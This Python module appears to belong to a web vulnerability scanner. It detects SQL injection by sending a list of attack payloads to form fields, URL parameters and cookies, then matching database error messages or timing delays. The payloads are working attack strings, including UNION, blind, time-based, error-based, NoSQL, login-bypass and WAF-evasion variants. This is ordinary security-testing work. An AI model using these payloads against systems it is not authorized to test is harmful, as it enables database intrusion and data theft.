"""
SQL Injection detection module
"""

import re
from typing import Dict, List, Any

from .base import PayloadModule
from ..core.config import Target
from ..core.scanner import SecurityScanner


class SQLInjectionModule(PayloadModule):
    """SQL Injection vulnerability detection module"""
    
    def __init__(self):
        # SQL injection payloads
        sqli_payloads = [
            # Basic SQL injection
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            
            # Union-based
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT 1,2,3--",
            
            # Boolean-based blind
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            
            # Time-based blind
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; SELECT pg_sleep(5)--",
            
            # Error-based
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # NoSQL injection
            "' || '1'=='1",
            "'; return true; //",
            "' && this.password.match(/.*/)//+%00",
            
            # Second-order
            "admin'--",
            "admin' #",
            "admin'/*",
            
            # WAF bypass
            "/*!50000SELECT*/ * /*!50000FROM*/ users",
            "SeLeCt * FrOm users",
            "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
        ]
        
        super().__init__(
            name="sqli",
            description="SQL Injection vulnerability detection",
            payloads=sqli_payloads
        )
        
        # SQL error patterns
        self.error_patterns = [
            # MySQL
            r"You have an error in your SQL syntax",
            r"mysql_fetch_array\(\)",
            r"mysql_num_rows\(\)",
            r"Warning.*mysql_.*",
            
            # PostgreSQL
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            
            # MSSQL
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"Microsoft JET Database Engine",
            r"ADODB\.Field error",
            r"Unclosed quotation mark after the character string",
            
            # Oracle
            r"ORA-[0-9]{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            
            # SQLite
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            
            # Generic
            r"SQL syntax.*MySQL",
            r"Warning.*\Wmysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL server version",
        ]
        
        # Time-based detection thresholds
        self.time_threshold = 4.0  # seconds
    
    async def scan(self, target: Target, scanner: SecurityScanner) -> Dict[str, Any]:
        """Scan for SQL injection vulnerabilities"""
        
        self.logger.info(f"Starting SQL injection scan for {target.url}")
        
        results = {
            'module': self.name,
            'vulnerabilities': [],
            'requests_made': 0,
            'payloads_tested': 0
        }
        
        async with scanner:
            # Analyze target for forms and parameters
            target_analysis = await scanner.analyze_target(target)
            
            # Test forms for SQL injection
            for form in target_analysis.get('forms', []):
                await self._test_form_sqli(target, scanner, form)
            
            # Test URL parameters
            await self._test_url_parameters(target, scanner)
            
            # Test cookies
            await self._test_cookie_sqli(target, scanner)
        
        # Compile results
        results['vulnerabilities'] = self.get_vulnerabilities()
        results['requests_made'] = self.stats['requests_made']
        results['payloads_tested'] = self.stats['payloads_tested']
        
        self.logger.info(f"SQL injection scan completed. Found {len(results['vulnerabilities'])} vulnerabilities")
        
        return results
    
    async def _test_form_sqli(self, target: Target, scanner: SecurityScanner, form: Dict[str, Any]):
        """Test form inputs for SQL injection"""
        
        for input_field in form.get('inputs', []):
            input_type = input_field.get('type', 'text')
            if input_type not in ['submit', 'button', 'reset', 'file']:
                parameter = input_field.get('name')
                if parameter:
                    await self._test_parameter_sqli(
                        target, scanner, parameter, form.get('method', 'GET')
                    )
    
    async def _test_url_parameters(self, target: Target, scanner: SecurityScanner):
        """Test URL parameters for SQL injection"""
        
        # Common parameter names that might be vulnerable
        common_params = ['id', 'user', 'page', 'category', 'item', 'product', 'search']
        
        for param in common_params:
            await self._test_parameter_sqli(target, scanner, param, 'GET')
    
    async def _test_parameter_sqli(
        self, 
        target: Target, 
        scanner: SecurityScanner, 
        parameter: str, 
        method: str
    ):
        """Test specific parameter for SQL injection"""
        
        # Test error-based SQL injection first
        error_payloads = [p for p in self.payloads if not any(
            keyword in p.lower() for keyword in ['sleep', 'waitfor', 'pg_sleep']
        )]
        
        results = await scanner.test_multiple_payloads(
            target, error_payloads, parameter, method
        )
        
        for result in results:
            if self._check_error_based_sqli(result):
                vulnerability = self.create_vulnerability(
                    title=f"SQL Injection in {parameter} (Error-based)",
                    severity="CRITICAL",
                    description=f"Error-based SQL injection detected in parameter '{parameter}'",
                    evidence={
                        'parameter': parameter,
                        'payload': result['payload'],
                        'method': method,
                        'response_snippet': result['content'][:1000],
                        'status_code': result['status_code'],
                        'injection_type': 'error-based'
                    },
                    recommendation="Use parameterized queries and input validation",
                    cwe_id="CWE-89",
                    owasp_category="A03:2021 – Injection"
                )
                
                self.add_vulnerability(vulnerability)
        
        # Test time-based SQL injection
        await self._test_time_based_sqli(target, scanner, parameter, method)
    
    async def _test_time_based_sqli(
        self, 
        target: Target, 
        scanner: SecurityScanner, 
        parameter: str, 
        method: str
    ):
        """Test for time-based SQL injection"""
        
        time_payloads = [p for p in self.payloads if any(
            keyword in p.lower() for keyword in ['sleep', 'waitfor', 'pg_sleep']
        )]
        
        for payload in time_payloads[:3]:  # Test subset to avoid long delays
            result = await scanner.test_payload(target, payload, parameter, method)
            
            if result and result.get('response_time', 0) > self.time_threshold:
                vulnerability = self.create_vulnerability(
                    title=f"SQL Injection in {parameter} (Time-based)",
                    severity="HIGH",
                    description=f"Time-based SQL injection detected in parameter '{parameter}'",
                    evidence={
                        'parameter': parameter,
                        'payload': payload,
                        'method': method,
                        'response_time': result.get('response_time'),
                        'time_threshold': self.time_threshold,
                        'injection_type': 'time-based'
                    },
                    recommendation="Use parameterized queries and input validation",
                    cwe_id="CWE-89",
                    owasp_category="A03:2021 – Injection"
                )
                
                self.add_vulnerability(vulnerability)
                break  # Found time-based SQLi, no need to test more payloads
    
    async def _test_cookie_sqli(self, target: Target, scanner: SecurityScanner):
        """Test cookies for SQL injection"""
        
        if not target.cookies:
            return
        
        for cookie_name in target.cookies.keys():
            # Test a subset of payloads on cookies
            test_payloads = self.payloads[:10]
            
            for payload in test_payloads:
                test_cookies = target.cookies.copy()
                test_cookies[cookie_name] = payload
                
                async with scanner:
                    response = await scanner._make_request(
                        'GET', target.url, target, cookies=test_cookies
                    )
                    
                    if response:
                        result = {
                            'payload': payload,
                            'parameter': cookie_name,
                            'method': 'COOKIE',
                            'status_code': response.status_code,
                            'content': response.text,
                            'response_time': response.elapsed.total_seconds()
                        }
                        
                        if self._check_error_based_sqli(result):
                            vulnerability = self.create_vulnerability(
                                title=f"SQL Injection in {cookie_name} cookie",
                                severity="HIGH",
                                description=f"SQL injection detected in cookie '{cookie_name}'",
                                evidence={
                                    'cookie': cookie_name,
                                    'payload': payload,
                                    'response_snippet': response.text[:500],
                                    'injection_type': 'cookie-based'
                                },
                                recommendation="Validate and sanitize cookie values",
                                cwe_id="CWE-89",
                                owasp_category="A03:2021 – Injection"
                            )
                            
                            self.add_vulnerability(vulnerability)
    
    def analyze_response(self, result: Dict[str, Any]) -> bool:
        """Analyze response for SQL injection indicators"""
        return self._check_error_based_sqli(result)
    
    def _check_error_based_sqli(self, result: Dict[str, Any]) -> bool:
        """Check for error-based SQL injection indicators"""
        
        content = result.get('content', '')
        
        # Check for SQL error patterns
        for pattern in self.error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        # Check for common SQL keywords in errors
        sql_keywords = [
            'syntax error', 'mysql', 'postgresql', 'oracle', 'sqlite',
            'odbc', 'jdbc', 'database', 'sql', 'query', 'table'
        ]
        
        content_lower = content.lower()
        error_indicators = ['error', 'warning', 'exception', 'fatal']
        
        # Look for combinations of error indicators and SQL keywords
        for error_word in error_indicators:
            if error_word in content_lower:
                for sql_word in sql_keywords:
                    if sql_word in content_lower:
                        return True
        
        return False